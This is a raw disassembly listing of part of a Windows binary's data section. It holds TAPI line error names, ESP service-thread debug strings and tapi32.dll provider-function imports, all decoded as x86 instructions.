  40153a:	push   esi
  40153b:	inc    ecx
  40153c:	dec    esp
  40153d:	push   esp
  40153e:	dec    edi
  40153f:	dec    esi
  401540:	inc    ebp
  401541:	add    BYTE PTR [eax],al
  401543:	add    BYTE PTR [ecx+0x4e],cl
  401546:	push   esi
  401547:	inc    ecx
  401548:	dec    esp
  401549:	push   esp
  40154a:	dec    edi
  40154b:	dec    esi
  40154c:	inc    ebp
  40154d:	dec    esp
  40154e:	dec    ecx
  40154f:	push   ebx
  401550:	push   esp
  401551:	add    BYTE PTR [eax],al
  401553:	add    BYTE PTR [ecx+0x4e],cl
  401556:	push   esi
  401557:	inc    ecx
  401558:	dec    esp
  401559:	push   esp
  40155a:	dec    edi
  40155b:	dec    esi
  40155c:	inc    ebp
  40155d:	dec    ebp
  40155e:	dec    edi
  40155f:	inc    esp
  401560:	inc    ebp
  401561:	add    BYTE PTR [eax],al
  401563:	add    BYTE PTR [ecx+0x4e],cl
  401566:	push   esi
  401567:	inc    ecx
  401568:	dec    esp
  401569:	push   esp
  40156a:	push   edx
  40156b:	inc    ecx
  40156c:	dec    esi
  40156d:	push   ebx
  40156e:	inc    esi
  40156f:	inc    ebp
  401570:	push   edx
  401571:	dec    ebp
  401572:	dec    edi
  401573:	inc    esp
  401574:	inc    ebp
  401575:	add    BYTE PTR [eax],al
  401577:	add    BYTE PTR [ecx+ecx*2+0x4e],cl
  40157b:	inc    ebp
  40157c:	dec    ebp
  40157d:	inc    ecx
  40157e:	push   eax
  40157f:	push   eax
  401580:	inc    ebp
  401581:	push   edx
  401582:	inc    esi
  401583:	inc    ecx
  401584:	dec    ecx
  401585:	dec    esp
  401586:	inc    ebp
  401587:	inc    esp
  401588:	add    BYTE PTR [eax],al
  40158a:	add    BYTE PTR [eax],al
  40158c:	dec    esi
  40158d:	dec    edi
  40158e:	inc    ebx
  40158f:	dec    edi
  401590:	dec    esi
  401591:	inc    esi
  401592:	inc    ebp
  401593:	push   edx
  401594:	inc    ebp
  401595:	dec    esi
  401596:	inc    ebx
  401597:	inc    ebp
  401598:	add    BYTE PTR [eax],al
  40159a:	add    BYTE PTR [eax],al
  40159c:	dec    esi
  40159d:	dec    edi
  40159e:	inc    esp
  40159f:	inc    ebp
  4015a0:	push   esi
  4015a1:	dec    ecx
  4015a2:	inc    ebx
  4015a3:	inc    ebp
  4015a4:	add    BYTE PTR [eax],al
  4015a6:	add    BYTE PTR [eax],al
  4015a8:	dec    esi
  4015a9:	dec    edi
  4015aa:	inc    esp
  4015ab:	push   edx
  4015ac:	dec    ecx
  4015ad:	push   esi
  4015ae:	inc    ebp
  4015af:	push   edx
  4015b0:	add    BYTE PTR [eax],al
  4015b2:	add    BYTE PTR [eax],al
  4015b4:	dec    esi
  4015b5:	dec    edi
  4015b6:	dec    ebp
  4015b7:	inc    ebp
  4015b8:	dec    ebp
  4015b9:	add    BYTE PTR [eax],al
  4015bb:	add    BYTE PTR [esi+0x4f],cl
  4015be:	push   edx
  4015bf:	inc    ebp
  4015c0:	push   ecx
  4015c1:	push   ebp
  4015c2:	inc    ebp
  4015c3:	push   ebx
  4015c4:	push   esp
  4015c5:	add    BYTE PTR [eax],al
  4015c7:	add    BYTE PTR [esi+0x4f],cl
  4015ca:	push   esp
  4015cb:	dec    edi
  4015cc:	push   edi
  4015cd:	dec    esi
  4015ce:	inc    ebp
  4015cf:	push   edx
  4015d0:	add    BYTE PTR [eax],al
  4015d2:	add    BYTE PTR [eax],al
  4015d4:	dec    esi
  4015d5:	dec    edi
  4015d6:	push   esp
  4015d7:	push   edx
  4015d8:	inc    ebp
  4015d9:	inc    edi
  4015da:	dec    ecx
  4015db:	push   ebx
  4015dc:	push   esp
  4015dd:	inc    ebp
  4015de:	push   edx
  4015df:	inc    ebp
  4015e0:	inc    esp
  4015e1:	add    BYTE PTR [eax],al
  4015e3:	add    BYTE PTR [edi+0x50],cl
  4015e6:	inc    ebp
  4015e7:	push   edx
  4015e8:	inc    ecx
  4015e9:	push   esp
  4015ea:	dec    ecx
  4015eb:	dec    edi
  4015ec:	dec    esi
  4015ed:	inc    esi
  4015ee:	inc    ecx
  4015ef:	dec    ecx
  4015f0:	dec    esp
  4015f1:	inc    ebp
  4015f2:	inc    esp
  4015f3:	add    BYTE PTR [edi+0x50],cl
  4015f6:	inc    ebp
  4015f7:	push   edx
  4015f8:	inc    ecx
  4015f9:	push   esp
  4015fa:	dec    ecx
  4015fb:	dec    edi
  4015fc:	dec    esi
  4015fd:	push   ebp
  4015fe:	dec    esi
  4015ff:	inc    ecx
  401600:	push   esi
  401601:	inc    ecx
  401602:	dec    ecx
  401603:	dec    esp
  401604:	add    BYTE PTR [eax],al
  401606:	add    BYTE PTR [eax],al
  401608:	push   edx
  401609:	inc    ecx
  40160a:	push   esp
  40160b:	inc    ebp
  40160c:	push   ebp
  40160d:	dec    esi
  40160e:	inc    ecx
  40160f:	push   esi
  401610:	inc    ecx
  401611:	dec    ecx
  401612:	dec    esp
  401613:	add    BYTE PTR [edx+0x45],dl
  401616:	push   ebx
  401617:	dec    edi
  401618:	push   ebp
  401619:	push   edx
  40161a:	inc    ebx
  40161b:	inc    ebp
  40161c:	push   ebp
  40161d:	dec    esi
  40161e:	inc    ecx
  40161f:	push   esi
  401620:	inc    ecx
  401621:	dec    ecx
  401622:	dec    esp
  401623:	add    BYTE PTR [edx+0x45],dl
  401626:	push   ecx
  401627:	push   ebp
  401628:	inc    ebp
  401629:	push   ebx
  40162a:	push   esp
  40162b:	dec    edi
  40162c:	push   esi
  40162d:	inc    ebp
  40162e:	push   edx
  40162f:	push   edx
  401630:	push   ebp
  401631:	dec    esi
  401632:	add    BYTE PTR [eax],al
  401634:	push   ebx
  401635:	push   esp
  401636:	push   edx
  401637:	push   ebp
  401638:	inc    ebx
  401639:	push   esp
  40163a:	push   ebp
  40163b:	push   edx
  40163c:	inc    ebp
  40163d:	push   esp
  40163e:	dec    edi
  40163f:	dec    edi
  401640:	push   ebx
  401641:	dec    ebp
  401642:	inc    ecx
  401643:	dec    esp
  401644:	dec    esp
  401645:	add    BYTE PTR [eax],al
  401647:	add    BYTE PTR [ecx+eax*2+0x52],dl
  40164b:	inc    edi
  40164c:	inc    ebp
  40164d:	push   esp
  40164e:	dec    esi
  40164f:	dec    edi
  401650:	push   esp
  401651:	inc    esi
  401652:	dec    edi
  401653:	push   ebp
  401654:	dec    esi
  401655:	inc    esp
  401656:	add    BYTE PTR [eax],al
  401658:	push   esp
  401659:	inc    ecx
  40165a:	push   edx
  40165b:	inc    edi
  40165c:	inc    ebp
  40165d:	push   esp
  40165e:	push   ebx
  40165f:	inc    ebp
  401660:	dec    esp
  401661:	inc    esi
  401662:	add    BYTE PTR [eax],al
  401664:	push   ebp
  401665:	dec    esi
  401666:	dec    ecx
  401667:	dec    esi
  401668:	dec    ecx
  401669:	push   esp
  40166a:	dec    ecx
  40166b:	inc    ecx
  40166c:	dec    esp
  40166d:	dec    ecx
  40166e:	pop    edx
  40166f:	inc    ebp
  401670:	inc    esp
  401671:	add    BYTE PTR [eax],al
  401673:	add    BYTE PTR [ebp+0x53],dl
  401676:	inc    ebp
  401677:	push   edx
  401678:	push   ebp
  401679:	push   ebx
  40167a:	inc    ebp
  40167b:	push   edx
  40167c:	dec    ecx
  40167d:	dec    esi
  40167e:	inc    esi
  40167f:	dec    edi
  401680:	push   esp
  401681:	dec    edi
  401682:	dec    edi
  401683:	inc    edx
  401684:	dec    ecx
  401685:	inc    edi
  401686:	add    BYTE PTR [eax],al
  401688:	push   edx
  401689:	inc    ebp
  40168a:	dec    ecx
  40168b:	dec    esi
  40168c:	dec    ecx
  40168d:	push   esp
  40168e:	add    BYTE PTR [eax],al
  401690:	inc    ecx
  401691:	inc    esp
  401692:	inc    esp
  401693:	push   edx
  401694:	inc    ebp
  401695:	push   ebx
  401696:	push   ebx
  401697:	inc    edx
  401698:	dec    esp
  401699:	dec    edi
  40169a:	inc    ebx
  40169b:	dec    ebx
  40169c:	inc    ebp
  40169d:	inc    esp
  40169e:	add    BYTE PTR [eax],al
  4016a0:	inc    edx
  4016a1:	dec    ecx
  4016a2:	dec    esp
  4016a3:	dec    esp
  4016a4:	dec    ecx
  4016a5:	dec    esi
  4016a6:	inc    edi
  4016a7:	push   edx
  4016a8:	inc    ebp
  4016a9:	dec    edx
  4016aa:	inc    ebp
  4016ab:	inc    ebx
  4016ac:	push   esp
  4016ad:	inc    ebp
  4016ae:	inc    esp
  4016af:	add    BYTE PTR [ecx+0x4e],cl
  4016b2:	push   esi
  4016b3:	inc    ecx
  4016b4:	dec    esp
  4016b5:	inc    esi
  4016b6:	inc    ebp
  4016b7:	inc    ecx
  4016b8:	push   esp
  4016b9:	push   ebp
  4016ba:	push   edx
  4016bb:	inc    ebp
  4016bc:	add    BYTE PTR [eax],al
  4016be:	add    BYTE PTR [eax],al
  4016c0:	dec    esi
  4016c1:	dec    edi
  4016c2:	dec    ebp
  4016c3:	push   ebp
  4016c4:	dec    esp
  4016c5:	push   esp
  4016c6:	dec    ecx
  4016c7:	push   eax
  4016c8:	dec    esp
  4016c9:	inc    ebp
  4016ca:	dec    ecx
  4016cb:	dec    esi
  4016cc:	push   ebx
  4016cd:	push   esp
  4016ce:	inc    ecx
  4016cf:	dec    esi
  4016d0:	inc    ebx
  4016d1:	inc    ebp
  4016d2:	add    BYTE PTR [eax],al
  4016d4:	inc    ecx
  4016d5:	inc    esp
  4016d6:	inc    esp
  4016d7:	push   edx
  4016d8:	inc    ebp
  4016d9:	push   ebx
  4016da:	push   ebx
  4016db:	push   ebx
  4016dc:	push   esp
  4016dd:	inc    ecx
  4016de:	push   esp
  4016df:	inc    ebp
  4016e0:	add    BYTE PTR [eax],al
  4016e2:	add    BYTE PTR [eax],al
  4016e4:	inc    ebx
  4016e5:	inc    ecx
  4016e6:	dec    esp
  4016e7:	dec    esp
  4016e8:	inc    esp
  4016e9:	inc    ebp
  4016ea:	push   esi
  4016eb:	push   ebx
  4016ec:	push   eax
  4016ed:	inc    ebp
  4016ee:	inc    ebx
  4016ef:	dec    ecx
  4016f0:	inc    esi
  4016f1:	dec    ecx
  4016f2:	inc    ebx
  4016f3:	add    BYTE PTR [ebx+0x41],al
  4016f6:	dec    esp
  4016f7:	dec    esp
  4016f8:	inc    esp
  4016f9:	inc    ebp
  4016fa:	push   esi
  4016fb:	push   ebx
  4016fc:	push   eax
  4016fd:	inc    ebp
  4016fe:	inc    ebx
  4016ff:	dec    ecx
  401700:	inc    esi
  401701:	dec    ecx
  401702:	inc    ebx
  401703:	inc    esi
  401704:	inc    ebp
  401705:	inc    ecx
  401706:	push   esp
  401707:	push   ebp
  401708:	push   edx
  401709:	inc    ebp
  40170a:	add    BYTE PTR [eax],al
  40170c:	inc    ebx
  40170d:	push   edx
  40170e:	inc    ebp
  40170f:	inc    ecx
  401710:	push   esp
  401711:	inc    ebp
  401712:	inc    esp
  401713:	dec    ecx
  401714:	inc    ecx
  401715:	dec    esp
  401716:	dec    edi
  401717:	inc    edi
  401718:	dec    ecx
  401719:	dec    esi
  40171a:	push   ebx
  40171b:	push   esp
  40171c:	inc    ecx
  40171d:	dec    esi
  40171e:	inc    ebx
  40171f:	inc    ebp
  401720:	add    BYTE PTR [eax],al
  401722:	add    BYTE PTR [eax],al
  401724:	inc    ebx
  401725:	dec    esp
  401726:	dec    edi
  401727:	push   ebx
  401728:	inc    ebp
  401729:	add    BYTE PTR [eax],al
  40172b:	add    BYTE PTR [ebp+eax*2+0x56],al
  40172f:	push   ebx
  401730:	push   eax
  401731:	inc    ebp
  401732:	inc    ebx
  401733:	dec    ecx
  401734:	inc    esi
  401735:	dec    ecx
  401736:	inc    ebx
  401737:	add    BYTE PTR [ebp+eax*2+0x56],al
  40173b:	push   ebx
  40173c:	push   eax
  40173d:	inc    ebp
  40173e:	inc    ebx
  40173f:	dec    ecx
  401740:	inc    esi
  401741:	dec    ecx
  401742:	inc    ebx
  401743:	inc    esi
  401744:	inc    ebp
  401745:	inc    ecx
  401746:	push   esp
  401747:	push   ebp
  401748:	push   edx
  401749:	inc    ebp
  40174a:	add    BYTE PTR [eax],al
  40174c:	inc    edi
  40174d:	inc    ecx
  40174e:	push   esp
  40174f:	dec    eax
  401750:	inc    ebp
  401751:	push   edx
  401752:	inc    esp
  401753:	dec    ecx
  401754:	inc    edi
  401755:	dec    ecx
  401756:	push   esp
  401757:	push   ebx
  401758:	add    BYTE PTR [eax],al
  40175a:	add    BYTE PTR [eax],al
  40175c:	inc    edi
  40175d:	inc    ebp
  40175e:	dec    esi
  40175f:	inc    ebp
  401760:	push   edx
  401761:	inc    ecx
  401762:	push   esp
  401763:	inc    ebp
  401764:	add    BYTE PTR [eax],al
  401766:	add    BYTE PTR [eax],al
  401768:	dec    esp
  401769:	dec    ecx
  40176a:	dec    esi
  40176b:	inc    ebp
  40176c:	inc    esp
  40176d:	inc    ebp
  40176e:	push   esi
  40176f:	push   ebx
  401770:	push   esp
  401771:	inc    ecx
  401772:	push   esp
  401773:	inc    ebp
  401774:	add    BYTE PTR [eax],al
  401776:	add    BYTE PTR [eax],al
  401778:	dec    ebp
  401779:	dec    edi
  40177a:	dec    esi
  40177b:	dec    ecx
  40177c:	push   esp
  40177d:	dec    edi
  40177e:	push   edx
  40177f:	inc    esp
  401780:	dec    ecx
  401781:	inc    edi
  401782:	dec    ecx
  401783:	push   esp
  401784:	push   ebx
  401785:	add    BYTE PTR [eax],al
  401787:	add    BYTE PTR [ebp+0x4f],cl
  40178a:	dec    esi
  40178b:	dec    ecx
  40178c:	push   esp
  40178d:	dec    edi
  40178e:	push   edx
  40178f:	dec    ebp
  401790:	inc    ebp
  401791:	inc    esp
  401792:	dec    ecx
  401793:	inc    ecx
  401794:	add    BYTE PTR [eax],al
  401796:	add    BYTE PTR [eax],al
  401798:	dec    ebp
  401799:	dec    edi
  40179a:	dec    esi
  40179b:	dec    ecx
  40179c:	push   esp
  40179d:	dec    edi
  40179e:	push   edx
  40179f:	push   esp
  4017a0:	dec    edi
  4017a1:	dec    esi
  4017a2:	inc    ebp
  4017a3:	add    BYTE PTR [ebx+0x52],al
  4017a6:	inc    ebp
  4017a7:	inc    ecx
  4017a8:	push   esp
  4017a9:	inc    ebp
  4017aa:	add    BYTE PTR [eax],al
  4017ac:	push   edx
  4017ad:	inc    ebp
  4017ae:	dec    ebp
  4017af:	dec    edi
  4017b0:	push   esi
  4017b1:	inc    ebp
  4017b2:	add    BYTE PTR [eax],al
  4017b4:	push   ebx
  4017b5:	inc    ebp
  4017b6:	dec    esi
  4017b7:	inc    esp
  4017b8:	inc    esp
  4017b9:	dec    ecx
  4017ba:	inc    ecx
  4017bb:	dec    esp
  4017bc:	dec    edi
  4017bd:	inc    edi
  4017be:	dec    ecx
  4017bf:	dec    esi
  4017c0:	push   ebx
  4017c1:	push   esp
  4017c2:	inc    ecx
  4017c3:	dec    esi
  4017c4:	inc    ebx
  4017c5:	inc    ebp
  4017c6:	inc    esp
  4017c7:	inc    ecx
  4017c8:	push   esp
  4017c9:	inc    ecx
  4017ca:	add    BYTE PTR [eax],al
  4017cc:	inc    edx
  4017cd:	push   ebp
  4017ce:	push   esp
  4017cf:	push   esp
  4017d0:	dec    edi
  4017d1:	dec    esi
  4017d2:	add    BYTE PTR [eax],al
  4017d4:	push   ebx
  4017d5:	push   esp
  4017d6:	inc    ecx
  4017d7:	push   esp
  4017d8:	inc    ebp
  4017d9:	add    BYTE PTR [eax],al
  4017db:	add    BYTE PTR [ecx],dh
  4017dd:	xor    BYTE PTR cs:[eax],al
  4017e0:	xor    DWORD PTR [esi],ebp
  4017e2:	xor    al,0x0
  4017e4:	xor    ch,BYTE PTR [esi]
  4017e6:	xor    BYTE PTR [eax],al
  4017e8:	xor    ch,BYTE PTR [esi]
  4017ea:	xor    DWORD PTR [eax],eax
  4017ec:	xor    ch,BYTE PTR [esi]
  4017ee:	xor    al,BYTE PTR [eax]
  4017f0:	xor    ebp,DWORD PTR [esi]
  4017f2:	xor    BYTE PTR [eax],al
  4017f4:	xor    ebp,DWORD PTR [esi]
  4017f6:	xor    DWORD PTR [eax],eax
  4017f8:	inc    ebp
  4017f9:	push   ebx
  4017fa:	push   eax
  4017fb:	push   ebx
  4017fc:	gs jb  0x401875
  4017ff:	imul   esp,DWORD PTR [ebx+0x65],0x65726854
  401806:	popa   
  401807:	cmp    ah,BYTE PTR fs:[eax]
  40180a:	outs   dx,BYTE PTR gs:[esi]
  40180c:	je     0x401873
  40180e:	jb     0x401810
  401810:	inc    ebp
  401811:	push   ebx
  401812:	push   eax
  401813:	gs jbe 0x40187b
  401816:	outs   dx,BYTE PTR ds:[esi]
  401817:	je     0x401819
  401819:	add    BYTE PTR [eax],al
  40181b:	add    BYTE PTR [ebp+0x73],ah
  40181e:	jo     0x40188c
  401820:	jo     0x401885
  401822:	add    BYTE PTR [eax],al
  401824:	outs   dx,BYTE PTR ds:[esi]
  401825:	arpl   WORD PTR [ecx+0x6c],sp
  401828:	jb     0x40189a
  40182a:	arpl   WORD PTR [eax],ax
  40182c:	push   edx
  40182d:	jo     0x401892
  40182f:	push   ebx
  401830:	je     0x4018a4
  401832:	imul   ebp,DWORD PTR [esi+0x67],0x646e6942
  401839:	imul   ebp,DWORD PTR [esi+0x67],0x706d6f43
  401840:	outs   dx,DWORD PTR ds:[esi]
  401841:	jae    0x4018a8
  401843:	and    BYTE PTR [esi+0x61],ah
  401846:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x7265203a
  40184e:	jb     0x40188d
  401850:	and    eax,0x73202c64
  401855:	jp     0x4018a5
  401857:	gs je  0x40189b
  40185a:	fs fs jb 0x40189b
  40185e:	daa    
  40185f:	and    eax,0x2773
  401864:	push   edx
  401865:	jo     0x4018ca
  401867:	inc    edx
  401868:	imul   ebp,DWORD PTR [esi+0x64],0x46676e69
  40186f:	jb     0x4018e0
  401871:	ins    DWORD PTR es:[edi],dx
  401872:	push   ebx
  401873:	je     0x4018e7
  401875:	imul   ebp,DWORD PTR [esi+0x67],0x646e6942
  40187c:	imul   ebp,DWORD PTR [esi+0x67],0x69616620
  401883:	ins    BYTE PTR es:[edi],dx
  401884:	gs fs sub al,0x20
  401888:	gs jb  0x4018fd
  40188b:	cmp    eax,0x202c6425
  401890:	jae    0x40190c
  401892:	inc    edx
  401893:	imul   ebp,DWORD PTR [esi+0x64],0x3d676e69
  40189a:	daa    
  40189b:	and    eax,0x2773
  4018a0:	inc    ebp
  4018a1:	push   ebx
  4018a2:	push   eax
  4018a3:	push   ebx
  4018a4:	gs jb  0x40191d
  4018a7:	imul   esp,DWORD PTR [ebx+0x65],0x65726854
  4018ae:	popa   
  4018af:	cmp    ah,BYTE PTR fs:[eax]
  4018b2:	ja     0x401915
  4018b4:	imul   esi,DWORD PTR [ecx+ebp*2+0x6e],0x6f662067
  4018bc:	jb     0x4018de
  4018be:	gs jae 0x401931
  4018c1:	and    BYTE PTR [ecx+0x6e],ch
  4018c4:	imul   esi,DWORD PTR [eax+eiz*1+0x65],0x746e6576
  4018cc:	add    BYTE PTR [eax],al
  4018ce:	add    BYTE PTR [eax],al
  4018d0:	inc    ebp
  4018d1:	push   ebx
  4018d2:	push   eax
  4018d3:	push   ebx
  4018d4:	gs jb  0x40194d
  4018d7:	imul   esp,DWORD PTR [ebx+0x65],0x65726854
  4018de:	popa   
  4018df:	cmp    ah,BYTE PTR fs:[eax]
  4018e2:	gs jae 0x401955
  4018e5:	and    BYTE PTR [ecx+0x6e],ch
  4018e8:	imul   esi,DWORD PTR [eax+eiz*1+0x65],0x746e6576
  4018f0:	and    BYTE PTR [ebx+0x69],dh
  4018f3:	outs   dx,BYTE PTR ds:[si]
  4018f5:	popa   
  4018f6:	ins    BYTE PTR es:[edi],dx
  4018f7:	gs fs sub al,0x20
  4018fb:	inc    ebp
  4018fc:	pop    eax
  4018fd:	inc    ebx
  4018fe:	inc    ebp
  4018ff:	push   eax
  401900:	push   esp
  401901:	dec    ecx
  401902:	dec    edi
  401903:	dec    esi
  401904:	and    BYTE PTR [edi+0x68],dh
  401907:	imul   ebp,DWORD PTR [ebp+eiz*2+0x20],0x69797274
  40190f:	outs   dx,BYTE PTR ds:[esi]
  401910:	and    BYTE PTR [si+0x6f],dh
  401914:	and    BYTE PTR [ecx+0x74],ah
  401917:	je     0x40197a
  401919:	arpl   WORD PTR [eax+0x20],bp
  40191c:	je     0x40198d
  40191e:	and    BYTE PTR [ebp+0x73],ah
  401921:	jo     0x401923
  401923:	add    BYTE PTR [ebp+0x53],al
  401926:	push   eax
  401927:	push   ebx
  401928:	gs jb  0x4019a1
  40192b:	imul   esp,DWORD PTR [ebx+0x65],0x65726854
  401932:	popa   
  401933:	cmp    ah,BYTE PTR fs:[eax]
  401936:	gs jae 0x4019a9
  401939:	and    BYTE PTR [ecx+0x6e],ch
  40193c:	imul   esi,DWORD PTR [eax+eiz*1+0x65],0x746e6576
  401944:	and    BYTE PTR [ebx+0x69],dh
  401947:	outs   dx,BYTE PTR ds:[si]
  401949:	popa   
  40194a:	ins    BYTE PTR es:[edi],dx
  40194b:	gs fs sub al,0x20
  40194f:	popa   
  401950:	je     0x4019c6
  401952:	popa   
  401953:	arpl   WORD PTR [eax+0x65],bp
  401956:	and    BYTE PTR fs:[edi+ebp*2+0x20],dh
  40195b:	gs jae 0x4019ce
  40195e:	add    BYTE PTR [eax],al
  401960:	inc    ebp
  401961:	push   ebx
  401962:	push   eax
  401963:	push   ebx
  401964:	gs jb  0x4019dd
  401967:	imul   esp,DWORD PTR [ebx+0x65],0x65726854
  40196e:	popa   
  40196f:	cmp    ah,BYTE PTR fs:[eax]
  401972:	inc    ebp
  401973:	pop    eax
  401974:	inc    ebx
  401975:	inc    ebp
  401976:	push   eax
  401977:	push   esp
  401978:	dec    ecx
  401979:	dec    edi
  40197a:	dec    esi
  40197b:	and    BYTE PTR [edi+0x68],dh
  40197e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x20],0x6c6c6163
  401986:	imul   ebp,DWORD PTR [esi+0x67],0x50534520
  40198d:	inc    edi
  40198e:	gs je  0x4019d5
  401991:	bound  esi,QWORD PTR gs:[ebp+0x67]
  401995:	dec    edi
  401996:	jne    0x401a0c
  401998:	jo     0x401a0f
  40199a:	je     0x4019c4
  40199c:	sub    DWORD PTR [eax],eax
  40199e:	add    BYTE PTR [eax],al
  4019a0:	inc    ebp
  4019a1:	push   ebx
  4019a2:	push   eax
  4019a3:	push   ebx
  4019a4:	gs jb  0x401a1d
  4019a7:	imul   esp,DWORD PTR [ebx+0x65],0x65726854
  4019ae:	popa   
  4019af:	cmp    ah,BYTE PTR fs:[eax]
  4019b2:	inc    ebp
  4019b3:	pop    eax
  4019b4:	inc    ebx
  4019b5:	inc    ebp
  4019b6:	push   eax
  4019b7:	push   esp
  4019b8:	dec    ecx
  4019b9:	dec    edi
  4019ba:	dec    esi
  4019bb:	and    BYTE PTR [edi+0x68],dh
  4019be:	imul   ebp,DWORD PTR [ebp+eiz*2+0x20],0x6c6c6163
  4019c6:	imul   ebp,DWORD PTR [esi+0x67],0x50534520
  4019cd:	inc    edi
  4019ce:	gs je  0x401a28
  4019d1:	imul   esp,DWORD PTR [edi+eiz*2+0x65],0x65764574
  4019d9:	outs   dx,BYTE PTR ds:[esi]
  4019da:	je     0x401a4f
  4019dc:	sub    BYTE PTR [ecx],ch
  4019de:	add    BYTE PTR [eax],al
  4019e0:	push   esp
  4019e1:	push   ebx
  4019e2:	push   eax
  4019e3:	dec    ecx
  4019e4:	push   esi
  4019e5:	gs jb  0x401a5b
  4019e8:	imul   ebp,DWORD PTR [edi+0x6e],0x74754100
  4019ef:	outs   dx,DWORD PTR ds:[esi]
  4019f0:	inc    ebx
  4019f1:	ins    BYTE PTR es:[edi],dx
  4019f2:	outs   dx,DWORD PTR ds:[esi]
  4019f3:	jae    0x401a5a
  4019f5:	add    BYTE PTR [eax],al
  4019f7:	add    BYTE PTR [esi+0x75],cl
  4019fa:	ins    DWORD PTR es:[edi],dx
  4019fb:	dec    esp
  4019fc:	imul   ebp,DWORD PTR [esi+0x65],0x73
  401a03:	add    BYTE PTR [esi+0x75],cl
  401a06:	ins    DWORD PTR es:[edi],dx
  401a07:	inc    ecx
  401a08:	fs fs jb 0x401a7f
  401a0c:	push   eax
  401a0d:	gs jb  0x401a5c
  401a10:	imul   ebp,DWORD PTR [esi+0x65],0x6d754e00
  401a17:	inc    ebx
  401a18:	popa   
  401a19:	ins    BYTE PTR es:[edi],dx
  401a1a:	ins    BYTE PTR es:[edi],dx
  401a1b:	jae    0x401a6d
  401a1d:	gs jb  0x401a61
  401a20:	fs fs jb 0x401a24
  401a24:	dec    esi
  401a25:	jne    0x401a94
  401a27:	push   eax
  401a28:	push   0x73656e6f
  401a2d:	add    BYTE PTR [eax],al
  401a2f:	add    BYTE PTR [ebp+eiz*2+0x62],al
  401a33:	jne    0x401a9c
  401a35:	dec    edi
  401a36:	jne    0x401aac
  401a38:	jo     0x401aaf
  401a3a:	je     0x401a3c
  401a3c:	inc    ebx
  401a3d:	outs   dx,DWORD PTR ds:[esi]
  401a3e:	ins    DWORD PTR es:[edi],dx
  401a3f:	jo     0x401aad
  401a41:	gs je  0x401aad
  401a44:	outs   dx,DWORD PTR ds:[esi]
  401a45:	outs   dx,BYTE PTR ds:[esi]
  401a46:	add    BYTE PTR [eax],al
  401a48:	inc    esp
  401a49:	imul   esi,DWORD PTR [ebx+0x61],0x55656c62
  401a50:	dec    ecx
  401a51:	add    BYTE PTR [eax],al
  401a53:	add    BYTE PTR [ecx+0x75],al
  401a56:	je     0x401ac7
  401a58:	inc    edi
  401a59:	popa   
  401a5a:	je     0x401ac4
  401a5c:	gs jb  0x401aa6
  401a5f:	outs   dx,BYTE PTR gs:[esi]
  401a61:	gs jb  0x401ac5
  401a64:	je     0x401acb
  401a66:	dec    ebp
  401a67:	jae    0x401ad0
  401a69:	jae    0x401a6b
  401a6b:	add    BYTE PTR [ebp+0x53],cl
  401a6e:	and    BYTE PTR [ebx+0x61],dl
  401a71:	outs   dx,BYTE PTR ds:[esi]
  401a72:	jae    0x401a94
  401a74:	push   ebx
  401a75:	gs jb  0x401ae1
  401a78:	data16 add BYTE PTR [eax],al
  401a7b:	add    BYTE PTR [ebx+0x78],ah
  401a7e:	push   edi
  401a7f:	outs   dx,BYTE PTR ds:[esi]
  401a80:	add    BYTE PTR fs:[eax],al
  401a83:	add    BYTE PTR [ebx+0x78],ah
  401a86:	dec    esp
  401a87:	imul   esi,DWORD PTR [ebx+0x74],0x654c0031
  401a8e:	data16 je 0x401a91
  401a91:	add    BYTE PTR [eax],al
  401a93:	add    BYTE PTR [ebp+0x61],ch
  401a96:	js     0x401a98
  401a98:	ins    DWORD PTR es:[edi],dx
  401a99:	imul   ebp,DWORD PTR [esi+0x0],0x706f54
  401aa0:	push   edx
  401aa1:	imul   esp,DWORD PTR [edi+0x68],0x74
  401aa8:	inc    edx
  401aa9:	outs   dx,DWORD PTR ds:[esi]
  401aaa:	je     0x401b20
  401aac:	outs   dx,DWORD PTR ds:[esi]
  401aad:	ins    DWORD PTR es:[edi],dx
  401aae:	add    BYTE PTR [eax],al
  401ab0:	je     0x401ab2
  401ab2:	popa   
  401ab3:	add    BYTE PTR [eax+0x0],dh
  401ab6:	imul   eax,DWORD PTR [eax],0x320033
  401abc:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  401ac1:	add    BYTE PTR [eax+eax*1+0x0],ch
  401ac5:	add    BYTE PTR [eax],al
  401ac7:	add    BYTE PTR [edi+ebp*2+0x61],cl
  401acb:	fs dec esp
  401acd:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  401ad4:	js     0x401b2d
  401ad6:	sub    BYTE PTR [ecx+eiz*2+0x70],dh
  401ada:	imul   esi,DWORD PTR [ebx],0x6c642e32
  401ae0:	ins    BYTE PTR es:[edi],dx
  401ae1:	sub    DWORD PTR [eax],esp
  401ae3:	popaw  
  401ae5:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x7265202c
  401aed:	jb     0x401b2c
  401aef:	and    eax,0x64
  401af4:	ins    BYTE PTR es:[edi],dx
  401af5:	imul   ebp,DWORD PTR [esi+0x65],0x50646441
  401afc:	jb     0x401b6d
  401afe:	jbe    0x401b69
  401b00:	fs gs jb 0x401b04
  401b04:	ins    BYTE PTR es:[edi],dx
  401b05:	imul   ebp,DWORD PTR [esi+0x65],0x50746547
  401b0c:	jb     0x401b7d
  401b0e:	jbe    0x401b79
  401b10:	fs gs jb 0x401b60
  401b14:	imul   esi,DWORD PTR [ebx+0x74],0x6e696c00
  401b1b:	gs push edx
  401b1d:	gs ins DWORD PTR es:[edi],dx
  401b1f:	outs   dx,DWORD PTR ds:[esi]
  401b20:	jbe    0x401b87
  401b22:	push   eax
  401b23:	jb     0x401b94
  401b25:	jbe    0x401b90
  401b27:	fs gs jb 0x401b2b
  401b2b:	add    BYTE PTR [edi+0x65],al
  401b2e:	je     0x401b80
  401b30:	jb     0x401ba1
  401b32:	arpl   WORD PTR [ecx+0x64],ax
  401b35:	fs jb  0x401b60
  401b38:	je     0x401b9b
  401b3a:	jo     0x401ba5
  401b3c:	xor    esi,DWORD PTR [edx]
  401b3e:	sub    al,0x6c
  401b40:	imul   ebp,DWORD PTR [esi+0x65],0x50646441
  401b47:	jb     0x401bb8
  401b49:	jbe    0x401bb4
  401b4b:	fs gs jb 0x401b78
  401b4f:	and    BYTE PTR [esi+0x61],ah
  401b52:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x7265202c
  401b5a:	jb     0x401b99
  401b5c:	and    eax,0x45000064
  401b61:	push   ebx
  401b62:	push   eax
